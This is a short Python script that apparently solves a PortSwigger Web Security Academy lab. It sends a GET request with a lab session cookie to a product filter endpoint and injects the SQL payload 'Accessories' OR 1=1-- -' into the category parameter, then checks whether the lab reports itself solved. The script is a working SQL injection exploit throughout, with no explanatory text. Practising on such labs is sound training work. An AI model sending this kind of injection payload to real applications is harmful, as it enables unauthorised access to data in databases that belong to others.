import requests

url = "https://0a7f002803abeb4f80726c1a00c400ad.web-security-academy.net/filter"

cookies = {
    "session": "uQ9OCvHrQ4V0uAJ92mwJg9iG8asJtOlb"
}

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Referer": "https://0a7f002803abeb4f80726c1a00c400ad.web-security-academy.net/filter?category=Food+%26+Drink",
    "Accept-Language": "en-US,en;q=0.9"
}

params = {
    "category": "Accessories' OR 1=1-- -"
}

r = requests.get(url, headers=headers, cookies=cookies, params=params)

if "Congratulations, you solved the lab!" in r.text:
    print("Lab is Solved!")
else:
    print("Lab is not SolveD!")
    
print(r.text)